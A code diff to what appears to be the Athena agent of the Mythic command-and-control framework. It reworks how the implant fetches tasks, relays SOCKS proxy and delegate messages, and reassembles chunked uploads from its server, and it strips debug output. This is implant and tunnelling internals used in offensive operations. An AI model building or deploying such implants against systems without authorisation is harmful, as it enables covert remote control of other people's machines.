@@ -8,6 +8,7 @@ using Newtonsoft.Json;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
+using System.Linq;
 using System.Net;
 using System.Threading.Tasks;
 
@@ -56,27 +57,37 @@ namespace Athena
 
         public List<MythicTask> GetTasks()
         {
-            List<DelegateMessage> delegates = Globals.delegateMessages;
-            Globals.delegateMessages = new List<DelegateMessage>();
+
             GetTasking gt = new GetTasking()
             {
                 action = "get_tasking",
                 tasking_size = -1,
-                delegates = delegates
+                delegates = Globals.delegateMessages ?? new List<DelegateMessage>(),
+                //socks = Globals.bagOut.Values.ToList() ?? new List<SocksMessage>(),
+                socks = new List<SocksMessage>()
             };
+            
             try
             {
                 var responseString = this.MythicConfig.currentConfig.Send(gt).Result;
                 
-                GetTaskingResponse gtr = JsonConvert.DeserializeObject<GetTaskingResponse>(responseString);
+                GetTaskingResponse gtr = JsonConvert.DeserializeObject<GetTaskingResponse>(responseString); Globals.delegateMessages.Clear();
+                //Globals.bagOut.Clear();
+                //This can be cleaned up.
                 if (gtr != null)
                 {
-                    if(gtr.delegates != null && gtr.delegates.Count > 0)
+                    if (gtr.socks != null && gtr.socks.Count > 0)
+                    {
+                        foreach (var s in gtr.socks)
+                        {
+                            Globals.bagIn.Add(s);
+                        }
+                    }
+
+                    if (gtr.delegates != null && gtr.delegates.Count > 0)
                     {
                         foreach(var del in gtr.delegates)
                         {
-                            Console.WriteLine($"Message for: {del.uuid}");
-                            //Globals.outMessages.Add(del.uuid, del.message);
                             Globals.outMessages.Add(del);
                         }
                     }
@@ -95,12 +106,8 @@ namespace Athena
 
         public bool SendResponse(Dictionary<string,MythicJob> jobs)
         {
-            List<DelegateMessage> delegates = Globals.delegateMessages;
-            List<SocksMessage> socksOut = Globals.socksOut;
-            //This might be causing a race condition.
-            Globals.delegateMessages = new List<DelegateMessage>();
-            Globals.socksOut = new List<SocksMessage>();
             List<ResponseResult> lrr = new List<ResponseResult>();
+
             foreach(var job in jobs.Values)
             {
                 switch (job.task.command)
@@ -277,38 +284,26 @@ namespace Athena
             {
                 action = "post_response",
                 responses = lrr,
-                socks = socksOut,
-                delegates = delegates
+                socks = Globals.bagOut.Values.ToList() ?? new List<SocksMessage>(),
+                delegates = Globals.delegateMessages ?? new List<DelegateMessage>()
             };
 
             try
             {
                 var responseString = this.MythicConfig.currentConfig.Send(prr).Result;
+                Globals.bagOut.Clear();
+                Globals.delegateMessages.Clear();
                 if (responseString.Contains("chunk_data"))
                 {
                     PostUploadResponseResponse cs = JsonConvert.DeserializeObject<PostUploadResponseResponse>(responseString);
-                    //if (cs.delegates != null && cs.delegates.Count > 0)
-                    //{
-                    //    foreach (var del in cs.delegates)
-                    //    {
-                    //        Globals.outMessages.Add(del);
-                    //    }
-                    //}
-                    //if (cs.socks != null && cs.socks.Count > 0)
-                    //{
-                    //    foreach (var s in cs.socks)
-                    //    {
-                    //        Globals.socksIn.Add(s);
-                    //    }
-                    //}
 
                     if (cs == null)
                     {
-                        Console.WriteLine("CS is null");
                         return false;
                     }
                     else
                     {
+                        //Pass up delegates
                         if (cs.delegates != null && cs.delegates.Count > 0)
                         {
                             foreach (var del in cs.delegates)
@@ -316,31 +311,42 @@ namespace Athena
                                 Globals.outMessages.Add(del);
                             }
                         }
+                        //Pass up socks messages
                         if (cs.socks != null && cs.socks.Count > 0)
                         {
                             foreach (var s in cs.socks)
                             {
-                                Globals.socksIn.Add(s);
+                                Globals.bagIn.Add(s);
                             }
                         }
 
                         foreach (var response in cs.responses)
                         {
-                            Task.Run(() =>
+                            //Spin off new thread to upload new chunks
+
+                            if (!String.IsNullOrEmpty(response.chunk_data))
                             {
-                                if (!String.IsNullOrEmpty(response.chunk_data))
+                                //Spin up new task to handle uploads
+                                Task.Run(() =>
                                 {
                                     try
                                     {
+                                        //Get upload and mythic job
                                         MythicUploadJob uj = Globals.uploadJobs[response.task_id];
                                         MythicJob job = Globals.jobs[response.task_id];
+                                        
+                                        //Get current upload values
                                         uj.total_chunks = response.total_chunks;
                                         uj.chunk_num = response.chunk_num;
+
+                                        //Make sure we're tracking the download properly.
                                         if (!uj.chunkUploads.ContainsKey(response.chunk_num))
                                         {
                                             //Lock the Dictionary<int,string>()
+                                            //I wonder if I could update this to use concurrent bag instead?
                                             uj.locked = true;
                                             uj.chunkUploads.Add(response.chunk_num, response.chunk_data);
+
                                             //Unlock the Dictionary so that it can be written
                                             uj.locked = false;
                                         }
@@ -349,28 +355,15 @@ namespace Athena
                                     {
 
                                     }
-                                }
-                            });
+                                });
+                                
+                            }
                         }
                     }
                 }
                 else
                 {
                     PostResponseResponse cs = JsonConvert.DeserializeObject<PostResponseResponse>(responseString);
-                    //if (cs.delegates != null && cs.delegates.Count > 0)
-                    //{
-                    //    foreach (var del in cs.delegates)
-                    //    {
-                    //        Globals.outMessages.Add(del);
-                    //    }
-                    //}
-                    //if (cs.socks != null && cs.socks.Count > 0)
-                    //{
-                    //    foreach (var s in cs.socks)
-                    //    {
-                    //        Globals.socksIn.Add(s);
-                    //    }
-                    //}
 
                     if (string.IsNullOrEmpty(responseString))
                     {
@@ -389,10 +382,9 @@ namespace Athena
                         //Check for socks messages to pass on
                         if (cs.socks != null && cs.socks.Count > 0)
                         {
-                            Console.WriteLine("New Socks Messages.");
                             foreach (var s in cs.socks)
                             {
-                                Globals.socksIn.Add(s);
+                                Globals.bagIn.Add(s);
                             }
                         }
                         foreach (var response in cs.responses)
@@ -412,7 +404,6 @@ namespace Athena
             }
             catch (Exception e)
             {
-                Console.WriteLine(e.Message);
                 return false;
             }
             return true;
